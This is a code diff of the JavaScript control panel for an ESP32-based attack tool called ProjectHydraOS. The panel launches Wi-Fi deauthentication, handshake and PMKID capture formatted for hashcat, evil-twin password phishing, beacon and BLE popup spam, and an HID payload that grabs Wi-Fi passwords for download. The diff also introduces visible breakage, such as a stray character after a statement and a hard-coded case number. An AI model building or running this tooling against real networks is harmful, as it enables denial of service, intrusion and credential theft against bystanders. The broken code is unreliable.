@@ -1,3 +1,6 @@
+/* ═══════════════════════════════════════════════════
+ *  ProjectHydraOS — app.js  v1.1.3
+ * ═══════════════════════════════════════════════════ */
 
 var AttackStateEnum = { READY: 0, RUNNING: 1, FINISHED: 2, TIMEOUT: 3 };
 var AttackTypeEnum  = {
@@ -21,14 +24,17 @@ var attack_timeout        = 0;
 var time_elapsed          = 0;
 var currentAttackType     = -1;
 var defaultAttackMethodsHTML = "";
-var btStatusTimer         = null;
 
+/* ── Attack types that disconnect the management AP ── */
+/* For these, timer/countdown is shown only for beacon spam;
+ *  all others just show "initiated" + power-cycle warning if no timeout */
 var DISCONNECTS_MGMT_AP = [
     AttackTypeEnum.ATTACK_TYPE_DOS,
 AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN,
 AttackTypeEnum.ATTACK_TYPE_CLONE
 ];
 
+/* ── Attack types that have NO timeout option ── */
 var NO_TIMEOUT_TYPES = [
     AttackTypeEnum.ATTACK_TYPE_HANDSHAKE,
 AttackTypeEnum.ATTACK_TYPE_PMKID,
@@ -36,19 +42,15 @@ AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN,
 AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD
 ];
 
-/* ── Boot ────────────────────────────────────────── */
 window.onload = function () {
     defaultAttackMethodsHTML = document.getElementById("attack_method").outerHTML;
 
-    var savedTheme = localStorage.getItem("hydra_theme") || "dark";
-    document.documentElement.setAttribute("data-theme", savedTheme);
-
-    attachRippleToAll();
-
+    /* Show disclaimer only once per browser */
     if (localStorage.getItem("hydra_disclaimer_v1") === "accepted") {
         document.getElementById("disclaimer-overlay").style.display = "none";
         init();
     } else {
+        /* Checkbox enables the button */
         document.getElementById("disclaimer-check").addEventListener("change", function () {
             document.getElementById("disclaimer-btn").disabled = !this.checked;
         });
@@ -63,42 +65,13 @@ function dismissDisclaimer() {
 
 function init() {
     getStatus();
-    refreshAps();
+    refreshAps();   /* Auto-scan on first load */
     loadCurrentUrl();
 }
 
-/* ── Theme toggle ────────────────────────────────── */
-function toggleTheme() {
-    var html  = document.documentElement;
-    var theme = html.getAttribute("data-theme") === "dark" ? "light" : "dark";
-    html.setAttribute("data-theme", theme);
-    localStorage.setItem("hydra_theme", theme);
-}
-
-/* ── Ripple effect ───────────────────────────────── */
-function attachRipple(el) {
-    el.addEventListener("click", function (e) {
-        if (el.disabled) return;
-        var rect  = el.getBoundingClientRect();
-        var wave  = document.createElement("span");
-        var size  = Math.max(rect.width, rect.height) * 2;
-        wave.className = "ripple-wave";
-        wave.style.cssText =
-        "width:" + size + "px; height:" + size + "px;" +
-        "left:" + (e.clientX - rect.left - size / 2) + "px;" +
-        "top:"  + (e.clientY - rect.top  - size / 2) + "px;";
-        el.appendChild(wave);
-        setTimeout(function () { wave.remove(); }, 600);
-    });
-}
-
-function attachRippleToAll() {
-    document.querySelectorAll("button").forEach(attachRipple);
-}
-
-/* ── Tab switching ───────────────────────────────── */
+/* ── Tab switching ──────────────────────────────────── */
 function switchTab(name) {
-    document.querySelectorAll(".nav-item").forEach(function (b) {
+    document.querySelectorAll(".tab-btn").forEach(function (b) {
         b.classList.toggle("active", b.dataset.tab === name);
     });
     document.querySelectorAll(".tab-panel").forEach(function (p) {
@@ -106,7 +79,7 @@ function switchTab(name) {
     });
 }
 
-/* ── AP Scanning ─────────────────────────────────── */
+/* ── AP Scanning ────────────────────────────────────── */
 function refreshAps() {
     selectedApElements = [];
     apSsidMap = {};
@@ -114,7 +87,7 @@ function refreshAps() {
     updateSelectedCountBadge();
 
     var tbody = document.getElementById("ap-list");
-    tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg">Scanning… this may take a few seconds</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg">Scanning… this may take a few seconds</td></tr>';
 
     var oReq = new XMLHttpRequest();
     oReq.responseType = "arraybuffer";
@@ -124,49 +97,44 @@ function refreshAps() {
         tbody.innerHTML = "";
         var buf = oReq.response;
         if (!buf || buf.byteLength === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg err">No access points found.</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg" style="color:var(--danger);">No APs found.</td></tr>';
             return;
         }
         var byteArray = new Uint8Array(buf);
         var count = Math.floor(byteArray.byteLength / 40);
         if (count === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg err">No access points found.</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg" style="color:var(--danger);">No APs found.</td></tr>';
             return;
         }
         for (var i = 0; i < count; i++) {
-            var offset  = i * 40;
-            var ssid    = new TextDecoder("utf-8").decode(byteArray.subarray(offset, offset + 32)).replace(/\0/g, "").trim();
-            var bssid   = "";
+            var offset = i * 40;
+            var ssid   = new TextDecoder("utf-8").decode(byteArray.subarray(offset, offset + 32)).replace(/\0/g, "").trim();
+            var bssid  = "";
             for (var j = 0; j < 6; j++) {
                 bssid += uint8ToHex(byteArray[offset + 33 + j]);
                 if (j < 5) bssid += ":";
             }
             var rssiRaw = byteArray[offset + 39];
             var rssi    = rssiRaw - 255;
-            var ch      = byteArray[offset + 32];
             apSsidMap[i] = ssid || ("AP #" + i);
 
-            var rssiClass = rssi >= -60 ? "sig-strong" : rssi >= -75 ? "sig-ok" : "sig-weak";
             var tr = document.createElement("tr");
             tr.id  = String(i);
             tr.setAttribute("onclick", "selectAp(this)");
             tr.innerHTML =
-            '<td class="td-ssid">' + escapeHtml(apSsidMap[i]) + '</td>' +
-            '<td class="td-bssid"><code>' + bssid + '</code></td>' +
-            '<td class="td-ch">' + (ch || '?') + '</td>' +
-            '<td class="td-rssi"><span class="' + rssiClass + '">' + rssi + ' dBm</span></td>';
+            '<td>' + escapeHtml(apSsidMap[i]) + '</td>' +
+            '<td><code>' + bssid + '</code></td>' +
+            '<td>' + rssi + ' dBm</td>';
             tbody.appendChild(tr);
         }
     };
-
-    oReq.onerror   = function () { tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg err">Scan failed. Check connection to ESP32.</td></tr>'; };
-    oReq.ontimeout = function () { tbody.innerHTML = '<tr><td colspan="4" class="table-empty-msg err">Scan timed out.</td></tr>'; };
-
+    oReq.onerror   = function () { tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg" style="color:var(--danger);">Scan failed. Check connection to ESP32.</td></tr>'; };
+    oReq.ontimeout = function () { tbody.innerHTML = '<tr><td colspan="3" class="table-empty-msg" style="color:var(--danger);">Scan timed out.</td></tr>'; };
     oReq.open("GET", "http://192.168.4.1/ap-list", true);
     oReq.send();
 }
 
-/* ── AP Selection ────────────────────────────────── */
+/* ── AP Selection ───────────────────────────────────── */
 function getMaxTargets() {
     var attackType   = parseInt(document.getElementById("attack_type").value);
     var attackMethod = parseInt(document.getElementById("attack_method").value);
@@ -180,8 +148,8 @@ function getMaxTargets() {
     }
     if (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) return 0;
     if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_SPAM)     return 0;
-    if (attackType === AttackTypeEnum.ATTACK_TYPE_PROBE)       return 0;
-    if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD)  return 0;
+    if (attackType === AttackTypeEnum.ATTACK_TYPE_PROBE)     return 0;
+    if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD)     return 0;
     return 1;
 }
 
@@ -233,7 +201,7 @@ function updateSelectedChips() {
     var container = document.getElementById("selected-ap-chips");
     if (!container) return;
     if (selectedApElements.length === 0) {
-        container.innerHTML = '<span class="no-ap-hint">No target selected — pick a network in the Scan tab</span>';
+        container.innerHTML = '<span class="no-ap-hint">No AP selected — tap a row in the Scan tab</span>';
         return;
     }
     container.innerHTML = "";
@@ -247,14 +215,12 @@ function updateSelectedChips() {
 }
 
 function updateSelectedCountBadge() {
-    var n = selectedApElements.length;
     var badge = document.getElementById("selected-count-badge");
+    var n = selectedApElements.length;
     if (badge) badge.textContent = n === 0 ? "0 selected" : n + " selected";
-    var badge2 = document.getElementById("selected-count-badge-attack");
-    if (badge2) badge2.textContent = n === 0 ? "0 selected" : n + " selected";
 }
 
-/* ── Attack Type Selection ───────────────────────── */
+/* ── Attack Type Selection ──────────────────────────── */
 function selectAttackType(type, btn) {
     document.querySelectorAll('.type-btn').forEach(function (b) { b.classList.remove('active'); });
     btn.classList.add('active');
@@ -264,25 +230,26 @@ function selectAttackType(type, btn) {
 
 function updateConfigurableFields(el) {
     document.getElementById("attack_method").outerHTML = defaultAttackMethodsHTML;
-    var beaconCfg     = document.getElementById("beacon_config");
-    var methodRow     = document.getElementById("method-row");
-    var timeoutRow    = document.getElementById("timeout-row");
+    var beaconCfg  = document.getElementById("beacon_config");
+    var methodRow  = document.getElementById("method-row");
+    var timeoutRow = document.getElementById("timeout-row");
     var noTimeoutNote = document.getElementById("no-timeout-note");
 
-    beaconCfg.style.display = "none";
-    if (methodRow)     methodRow.style.display    = "block";
-    if (timeoutRow)    timeoutRow.style.display   = "block";
+    beaconCfg.style.display  = "none";
+    if (methodRow)  methodRow.style.display  = "block";
+    if (timeoutRow) timeoutRow.style.display = "block";
     if (noTimeoutNote) noTimeoutNote.style.display = "none";
 
     var type = parseInt(el.value);
 
+    /* Hide timeout for Handshake, PMKID, Evil Twin */
     if (NO_TIMEOUT_TYPES.indexOf(type) !== -1) {
         if (timeoutRow) timeoutRow.style.display = "none";
     }
 
     switch (type) {
         case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
-            setAttackMethods(["BSSID Clone (Aggressive)", "Normal Deauth", "Silent Capture"]);
+            setAttackMethods(["BSSID Clone (aggresive)", "Normal deauth", "Silent capture"]);
             break;
         case AttackTypeEnum.ATTACK_TYPE_PMKID:
             if (methodRow) methodRow.style.display = "none";
@@ -290,19 +257,13 @@ function updateConfigurableFields(el) {
         case AttackTypeEnum.ATTACK_TYPE_DOS:
             document.getElementById("attack_timeout").value = 2;
             if (noTimeoutNote) noTimeoutNote.style.display = "block";
-            setAttackMethods(["BSSID Clone (Aggressive)", "Normal Deauth", "Combined Deauth", "Multi-Clone Deauth"]);
+            setAttackMethods(["BSSID Clone (aggresive)", "Normal Deauth", "Combined deauth", "Deauth with multiple clones", "Handshake Hijack"]);
         break;
-
-        /* ── FIX #2: methodRow was previously hidden here, making mode never selectable.
-         *                     Now we SHOW methodRow for beacon spam so the user can pick a mode,
-         *                     then beaconCfg shows the count field below it. ── */
         case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM:
             document.getElementById("attack_timeout").value = 5;
-            /* methodRow stays visible (default block) — mode dropdown shows here */
-            setAttackMethods(["Common Names", "Random Strings", "Rick Roll Mode", "Security Names"]);
+            if (methodRow) methodRow.style.display = "none";
             beaconCfg.style.display = "block";
             break;
-
         case AttackTypeEnum.ATTACK_TYPE_PROBE:
             document.getElementById("attack_timeout").value = 5;
             if (methodRow) methodRow.style.display = "none";
@@ -311,56 +272,13 @@ function updateConfigurableFields(el) {
             if (methodRow) methodRow.style.display = "none";
             break;
         case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:
-
-            document.getElementById("attack_timeout").value = 15;
-
-            if (methodRow)
-                methodRow.style.display = "block";
-
-        setAttackMethods([
-
-            // 1-8 Apple Audio
-            "Apple Audio 1",
-            "Apple Audio 2",
-            "Apple Audio 3",
-            "Apple Audio 4",
-            "Apple Audio 5",
-            "Apple Audio 6",
-            "Apple Audio 7",
-            "Apple Audio 8",
-
-            // 9-13 Apple Setup
-            "Apple Setup 1",
-            "Apple Setup 2",
-            "Apple Setup 3",
-            "Apple Setup 4",
-            "Apple Setup 5",
-
-            // 14-19 Samsung
-            "Samsung Buds 1",
-            "Samsung Buds 2",
-            "Samsung Buds 3",
-            "Samsung Buds 4",
-            "Samsung Buds 5",
-            "Samsung Random",
-
-            // 20-24 Google
-            "Fast Pair 1",
-            "Fast Pair 2",
-            "Fast Pair 3",
-            "Fast Pair 4",
-            "Google Random",
-
-            // 25
-            "Mixed Random"
-        ]);
-
-        break;
+            document.getElementById("attack_timeout").value = 5;s
+            break;
         case AttackTypeEnum.ATTACK_TYPE_CLONE:
             document.getElementById("attack_timeout").value = 5;
             if (noTimeoutNote) noTimeoutNote.style.display = "block";
-            setAttackMethods(["Open Multiple Clones"]);
-        break;
+            setAttackMethods(["Open multiple clones"]);
+            break;
         case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:
             if (methodRow) methodRow.style.display = "none";
             break;
@@ -382,7 +300,7 @@ function setAttackMethods(arr) {
     enforceSelectionLimit();
 }
 
-/* ── Run Attack ──────────────────────────────────── */
+/* ── Run Attack ─────────────────────────────────────── */
 function runAttack() {
     hideError();
     var attackType = parseInt(document.getElementById("attack_type").value);
@@ -393,54 +311,43 @@ function runAttack() {
 
     var needsAp = (
         attackType !== AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM &&
-        attackType !== AttackTypeEnum.ATTACK_TYPE_BT_SPAM     &&
-        attackType !== AttackTypeEnum.ATTACK_TYPE_PROBE        &&
+        attackType !== AttackTypeEnum.ATTACK_TYPE_BT_SPAM &&
+        attackType !== AttackTypeEnum.ATTACK_TYPE_PROBE &&
         attackType !== AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD
     );
 
     if (needsAp && selectedApElements.length === 0) {
-        showDialog("Please select at least one target network before launching the attack.");
+        showDialog("Please select at least one target before the attack.");
         return false;
     }
 
     var MAX_TARGETS = 16;
 
-    var isNoTimeout    = NO_TIMEOUT_TYPES.indexOf(attackType) !== -1;
+    /* Timeout: fixed 0 (no timeout) for no-timeout types */
+    var isNoTimeout = NO_TIMEOUT_TYPES.indexOf(attackType) !== -1;
     var timeoutEnabled = isNoTimeout ? false : document.getElementById("timeout_enable").checked;
     var timeoutMin     = parseInt(document.getElementById("attack_timeout").value) || 1;
     var timeoutSec     = timeoutEnabled ? Math.min(65535, timeoutMin * 60) : 0;
 
-    /* Beacon spam: byte 1 = count, byte 4 = mode (repurposed from ap_count)
-     * All other attacks: byte 1 = method, byte 4 = ap count */
     var attackMethod = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
     ? (parseInt(document.getElementById("beacon_count").value) || 20)
     : (parseInt(document.getElementById("attack_method").value) || 0);
 
-    /* FIX #1: beaconMode was used in arr[4] without ever being defined, causing a
-     *          ReferenceError that silently aborts runAttack() before the XHR fires. */
-    var beaconMode = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
-    ? (parseInt(document.getElementById("attack_method").value) || 0)
-    : 0;
-
     var ids = selectedApElements.slice(0, MAX_TARGETS);
-
-    /* Binary payload layout:
-     *   Byte 0   — attack type
-     *   Byte 1   — attack method  OR  beacon count  (beacon spam)
-     *   Byte 2-3 — timeout seconds, little-endian
-     *   Byte 4   — ap count       OR  beacon mode   (beacon spam, repurposed)
-     *   Byte 5+  — AP index list  (unused for beacon spam)
-     */
     var buf = new ArrayBuffer(5 + MAX_TARGETS);
     var arr = new Uint8Array(buf);
 
-    arr[0] = attackType;
-    arr[1] = attackMethod;
-    arr[2] = timeoutSec & 0xFF;
-    arr[3] = (timeoutSec >> 8) & 0xFF;
-    arr[4] = (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM)
-    ? beaconMode    /* mode goes here; C reads attack_request->ap_count as mode */
-    : ids.length;
+    arr[0] = attackType;   // Byte 0
+    arr[1] = attackMethod; // Byte 1
+
+    // ৩. Timeout-কে ২ বাইটে ভাগ করা (Little Endian পদ্ধতিতে)
+    arr[2] = timeoutSec & 0xFF;         // Byte 2: Lower byte
+    arr[3] = (timeoutSec >> 8) & 0xFF;  // Byte 3: Upper byte
+
+    // ৪. AP Count এখন ৪ নম্বর ইনডেক্সে চলে যাবে
+    arr[4] = ids.length;   // Byte 4
+
+    // ৫. AP IDs এখন ৫ নম্বর ইনডেক্স থেকে শুরু হবে
     ids.forEach(function (id, i) { arr[5 + i] = id; });
 
     currentAttackType = attackType;
@@ -449,14 +356,16 @@ function runAttack() {
     setRunningVisible(true);
     setResultVisible(false);
 
-    var beaconWrap = document.getElementById("beacon-timer-wrap");
-    var simpleWrap = document.getElementById("simple-running-wrap");
-    var noTOHint   = document.getElementById("no-timeout-hint");
-    var infoEl     = document.getElementById("running-attack-info");
+    /* Show the right running UI */
+    var beaconWrap  = document.getElementById("beacon-timer-wrap");
+    var simpleWrap  = document.getElementById("simple-running-wrap");
+    var noTOHint    = document.getElementById("no-timeout-hint");
+    var infoEl      = document.getElementById("running-attack-info");
 
     if (attackType === AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM) {
-        beaconWrap.style.display = "block";
-        simpleWrap.style.display = "none";
+        /* Full circular timer only for beacon spam */
+        beaconWrap.style.display  = "block";
+        simpleWrap.style.display  = "none";
         if (noTOHint) noTOHint.style.display = "none";
         attack_timeout = timeoutEnabled ? (timeoutMin * 60) : Infinity;
         time_elapsed   = 0;
@@ -464,17 +373,15 @@ function runAttack() {
         running_poll = setInterval(countProgress, running_poll_interval);
         updateTimerDisplay();
     } else {
-        beaconWrap.style.display = "none";
-        simpleWrap.style.display = "block";
+        /* All other attacks: simple "initiated" view */
+        beaconWrap.style.display  = "none";
+        simpleWrap.style.display  = "block";
         stopProgressTimer();
+        /* Show power-cycle warning if management AP disconnects and no timeout */
         var disconnects = DISCONNECTS_MGMT_AP.indexOf(attackType) !== -1;
         if (noTOHint) {
             noTOHint.style.display = (disconnects && !timeoutEnabled && !isNoTimeout) ? "block" : "none";
         }
-    }
-
-    if (attackType === AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD) {
-        startBtStatusPoll();
     }
 
     if (infoEl) infoEl.textContent = attackTypeName(attackType);
@@ -483,11 +390,12 @@ function runAttack() {
     oReq.open("POST", "http://192.168.4.1/run-attack", true);
     oReq.onload  = function () { setTimeout(getStatus, 500); };
     oReq.onerror = function () {
-        if (attackType !== AttackTypeEnum.ATTACK_TYPE_DOS        &&
-            attackType !== AttackTypeEnum.ATTACK_TYPE_HANDSHAKE  &&
-            attackType !== AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN  &&
+        /* DoS/Handshake disconnect the AP — ignore connection error */
+        if (attackType !== AttackTypeEnum.ATTACK_TYPE_DOS &&
+            attackType !== AttackTypeEnum.ATTACK_TYPE_HANDSHAKE &&
+            attackType !== AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN &&
             attackType !== AttackTypeEnum.ATTACK_TYPE_CLONE) {
-            showError("Could not reach ESP32. Check the Wi-Fi connection.");
+            showError("Check ESP32 connection.");
             }
     };
     oReq.send(buf);
@@ -495,7 +403,7 @@ function runAttack() {
     return false;
 }
 
-/* ── Timer helpers ───────────────────────────────── */
+/* ── Timer Helpers ──────────────────────────────────── */
 function stopProgressTimer() {
     if (running_poll) { clearInterval(running_poll); running_poll = null; }
 }
@@ -517,7 +425,7 @@ function updateTimerDisplay() {
     elEl.textContent = formatTime(time_elapsed);
 
     if (attack_timeout === Infinity) {
-        if (ofEl) ofEl.textContent = "no timeout";
+        if (ofEl) ofEl.textContent = "No Timeout was set";
         if (path) path.setAttribute('stroke-dasharray', '100, 100');
     } else {
         if (ofEl) ofEl.textContent = "/ " + formatTime(attack_timeout);
@@ -533,7 +441,7 @@ function formatTime(sec) {
     return (m > 0 ? m + "m " : "") + s + "s";
 }
 
-/* ── Running / Result visibility ─────────────────── */
+/* ── Running / Result Visibility ───────────────────── */
 function setRunningVisible(v) {
     document.getElementById("running-section").style.display       = v ? "block" : "none";
     document.getElementById("attack-config-section").style.display = v ? "none"  : "block";
@@ -544,13 +452,13 @@ function setResultVisible(v) {
     document.getElementById("running-section").style.display = v ? "none"  : "block";
 }
 
-/* ── Show Result ─────────────────────────────────── */
+/* ── Show Result ────────────────────────────────────── */
 function showResult(status, attack_type, content_size, content) {
     stopProgressTimer();
-    stopBtStatusPoll();
     document.getElementById("running-section").style.display = "none";
     document.getElementById("result-section").style.display  = "block";
 
+    /* DoS and Handshake finishing on timeout is normal — show FINISHED */
     if (status === "TIMEOUT" &&
         (attack_type === AttackTypeEnum.ATTACK_TYPE_DOS ||
         attack_type === AttackTypeEnum.ATTACK_TYPE_HANDSHAKE)) {
@@ -561,8 +469,8 @@ function showResult(status, attack_type, content_size, content) {
     statusEl.textContent = status;
     statusEl.className   = "result-status " + (status === "FINISHED" ? "status-finished" : "status-timeout");
 
-    document.getElementById("result-type").textContent = attackTypeName(attack_type);
-    document.getElementById("result-body").innerHTML   = "";
+    document.getElementById("result-type").textContent   = attackTypeName(attack_type);
+    document.getElementById("result-body").innerHTML     = "";
 
     switch (attack_type) {
         case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
@@ -573,47 +481,52 @@ function showResult(status, attack_type, content_size, content) {
             break;
         case AttackTypeEnum.ATTACK_TYPE_DOS:
             document.getElementById("result-body").innerHTML =
-            '<p class="result-desc">Deauthentication attack completed. Targets were disconnected during the session.</p>';
+            '<p style="color:var(--text-muted);">Deauthentication attack completed. Targets were disconnected during the session.</p>';
         break;
         case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM:
             document.getElementById("result-body").innerHTML =
-            '<p class="result-desc">Beacon spam completed.</p>';
+            '<p style="color:var(--text-muted);">Beacon spam completed.</p>';
         break;
         case AttackTypeEnum.ATTACK_TYPE_PROBE:
             document.getElementById("result-body").innerHTML =
-            '<p class="result-desc">Probe attack completed. Data captured in serial log.</p>';
+            '<p style="color:var(--text-muted);">Probe attack completed. Data captured in serial log.</p>';
             break;
         case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:
             fetchEvilTwinResult();
             break;
         case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:
             document.getElementById("result-body").innerHTML =
-            '<p class="result-desc">BLE Spam finished. Nearby iOS / macOS devices should have seen popups.</p>';
+            '<div class="result-block" style="text-align:center;padding:20px 0;">' +
+            '<p style="font-size:1.2rem;margin-bottom:8px;">BLE Spam Finished</p>' +
+            '<p style="color:var(--text-muted);font-size:0.85rem;">Apple device advertisements were broadcast. Nearby iOS/macOS devices should have seen popups.</p>' +
+            '</div>';
             break;
-        case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:
+        case 4: // Payload 4
             document.getElementById("result-body").innerHTML =
-            '<div class="result-block"><p class="result-desc">Payload executed via HID attack.</p>' +
-            '<a class="btn-primary" style="text-decoration:none;display:inline-block;margin-top:12px;"' +
-            '   href="http://192.168.4.1/download-pass" download="wifi_passwords.txt">Download Passwords</a>' +
+            '<div class="result-block">' +
+            '<h4>Wi-Fi Credentials Grabbed</h4>' +
+            '<p>Payload executed via HID attack. Results are stored in ESP32 memory.</p>' +
+            '<a class="btn-primary" style="text-decoration:none;display:inline-block;margin-top:10px;" href="http://192.168.4.1/download-pass" download="wifi_passwords.txt">DOWNLOAD PASSWORDS</a>' +
             '</div>';
             break;
         default:
             document.getElementById("result-body").innerHTML =
-            '<p class="result-desc">Attack completed — type ' + attack_type + '.</p>';
+            '<p style="color:var(--text-muted);">Attack initiated — type ' + attack_type + '.</p>';
     }
-
     switchTab("attack");
 }
 
-/* ── Handshake result ────────────────────────────── */
+/* ── Handshake Result ───────────────────────────────── */
 function renderHandshakeResult(content, size) {
     var el = document.getElementById("result-body");
+    /* Fix: hccapx requires at least 4 bytes; pcap can be larger. Reasonable minimum ~50 bytes */
     if (!content || size < 4) {
         el.innerHTML =
-        '<p class="result-err">Handshake not captured.</p>' +
-        '<p class="result-desc">Not enough EAPOL frames collected. Try moving closer to the AP or use the Broadcast method.</p>';
+        '<p style="color:var(--danger);font-weight:600;margin-bottom:8px;">Handshake not captured.</p>' +
+        '<p style="color:var(--text-muted);font-size:.85rem;">Not enough EAPOL frames collected. Try moving closer to the AP or use the Broadcast method to force reconnection.</p>';
         return;
     }
+    /* Even if content is small, offer download links — firmware may have buffered the pcap */
     var hs = "";
     for (var i = 0; i < size; i++) {
         hs += uint8ToHex(content[i]);
@@ -621,22 +534,20 @@ function renderHandshakeResult(content, size) {
     }
     el.innerHTML =
     '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;">' +
-    '<a class="btn-secondary" style="text-decoration:none;display:inline-flex;align-items:center;"' +
-    '   href="http://192.168.4.1/capture.pcap" download="capture.pcap">↓ Download PCAP</a>' +
-    '<a class="btn-secondary" style="text-decoration:none;display:inline-flex;align-items:center;"' +
-    '   href="http://192.168.4.1/capture.hccapx" download="capture.hccapx">↓ Download HCCAPX</a>' +
+    '<a class="btn-secondary" style="text-decoration:none;display:inline-block;" href="http://192.168.4.1/capture.pcap" download="capture.pcap">DOWNLOAD PCAP</a>' +
+    '<a class="btn-secondary" style="text-decoration:none;display:inline-block;" href="http://192.168.4.1/capture.hccapx" download="capture.hccapx">DOWNLOAD HCCAPX</a>' +
     '</div>' +
-    '<div class="result-block"><div class="result-block-label">Raw HCCAPX Hex</div>' +
+    '<div class="result-block"><h4>Raw HCCAPX Hex Dump</h4>' +
     '<pre><code id="hccapx-dump">' + hs + '</code></pre>' +
-    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hccapx-dump\',this)">Copy</button>' +
+    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hccapx-dump\', this)">COPY</button>' +
     '</div>';
 }
 
-/* ── PMKID result ────────────────────────────────── */
+/* ── PMKID Result ───────────────────────────────────── */
 function renderPmkidResult(content, size) {
     var el = document.getElementById("result-body");
     if (!content || size < 13) {
-        el.innerHTML = '<p class="result-err">No PMKID captured. Try again closer to the AP.</p>';
+        el.innerHTML = '<p style="color:var(--danger);">No PMKID captured. Try again closer to the AP.</p>';
         return;
     }
     var idx = 0;
@@ -659,20 +570,20 @@ function renderPmkidResult(content, size) {
     var hashcat = (pmkid_lines[0] || "") + "*" + mac_ap + "*" + mac_sta + "*" + ssid;
     el.innerHTML =
     '<div class="result-block">' +
-    '<p><span class="kv-key">Station MAC</span> <code>' + mac_sta + '</code></p>' +
-    '<p><span class="kv-key">AP MAC</span>      <code>' + mac_ap  + '</code></p>' +
-    '<p><span class="kv-key">SSID</span>        <code>' + ssid + '</code> (' + escapeHtml(ssid_text) + ')</p>' +
+    '<p><strong>Station MAC:</strong> <code>' + mac_sta + '</code></p>' +
+    '<p><strong>AP MAC:</strong> <code>' + mac_ap + '</code></p>' +
+    '<p><strong>SSID:</strong> <code>' + ssid + '</code> (' + escapeHtml(ssid_text) + ')</p>' +
     '</div>' +
-    '<div class="result-block"><div class="result-block-label">PMKID</div>' +
+    '<div class="result-block"><h4>PMKID</h4>' +
     pmkid_lines.map(function (p, i) { return '<p>PMKID #' + i + ': <code>' + p + '</code></p>'; }).join("") +
     '</div>' +
-    '<div class="result-block"><div class="result-block-label">Hashcat Format</div>' +
+    '<div class="result-block"><h4>Hashcat Format</h4>' +
     '<pre><code id="hashcat-line">' + hashcat + '</code></pre>' +
-    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hashcat-line\',this)">Copy</button>' +
+    '<button class="btn-secondary" style="margin-top:8px;" onclick="copyText(\'hashcat-line\', this)">COPY</button>' +
     '</div>';
 }
 
-/* ── Evil Twin result ────────────────────────────── */
+/* ── Evil Twin Result ───────────────────────────────── */
 function fetchEvilTwinResult() {
     fetch('http://192.168.4.1/evil-twin-status')
     .then(function (r) { return r.json(); })
@@ -681,41 +592,42 @@ function fetchEvilTwinResult() {
         if (data.status === "SUCCESS") {
             el.innerHTML =
             '<div class="evil-twin-password-box">' +
-            '<div class="et-ok-icon">✓</div>' +
-            '<div class="et-label">Password Captured</div>' +
-            '<div class="et-password" id="et-password">' + escapeHtml(data.password) + '</div>' +
+            '<div class="success-icon">✓</div>' +
+            '<div class="label-text">Password Captured</div>' +
+            '<div class="password-value" id="et-password">' + escapeHtml(data.password) + '</div>' +
             (data.wrong_attempts > 0
-            ? '<div class="et-attempts">Wrong attempts before correct: <strong>' + data.wrong_attempts + '</strong></div>'
+            ? '<div class="wrong-attempts">Wrong attempts before correct password: <strong>' + data.wrong_attempts + '</strong></div>'
             : '') +
-            '<button class="btn-secondary" style="margin-top:14px;" onclick="copyText(\'et-password\',this)">Copy Password</button>' +
+            '<button class="btn-secondary" style="margin-top:14px;" onclick="copyText(\'et-password\', this)">COPY PASSWORD</button>' +
             '</div>';
         } else if (data.status === "RUNNING") {
             el.innerHTML =
-            '<div style="text-align:center;padding:20px 0;">' +
+            '<div class="evil-twin-running" style="text-align:center;padding:20px 0;">' +
             '<div class="spinner"></div>' +
-            '<p class="result-desc">Evil Twin running…</p>' +
-            '<p style="color:var(--acc-warn);margin-top:8px;font-size:0.85rem;">Wrong attempts: <strong>' + data.wrong_attempts + '</strong></p>' +
+            '<p>Evil Twin attack in progress…</p>' +
+            '<p style="color:var(--warn-text);margin-top:8px;font-size:0.85rem;">Wrong attempts so far: <strong>' + data.wrong_attempts + '</strong></p>' +
             '</div>';
             setTimeout(fetchEvilTwinResult, 2000);
         } else {
             el.innerHTML =
-            '<p class="result-err">Attack stopped — password not captured.</p>' +
-            '<p class="result-desc">Wrong attempts: ' + data.wrong_attempts + '</p>';
+            '<div class="result-block" style="text-align:center;">' +
+            '<p style="color:var(--danger);">Attack stopped — password not captured.</p>' +
+            '<p style="color:var(--text-muted);margin-top:8px;font-size:0.85rem;">Wrong attempts: ' + data.wrong_attempts + '</p>' +
+            '</div>';
         }
     })
     .catch(function () {
         document.getElementById("result-body").innerHTML =
-        '<p class="result-err">Failed to fetch Evil Twin status. ESP32 may have disconnected.</p>';
+        '<p style="color:var(--danger);">Failed to fetch Evil Twin status. ESP32 may have disconnected.</p>';
     });
 }
 
-/* ── Reset attack ────────────────────────────────── */
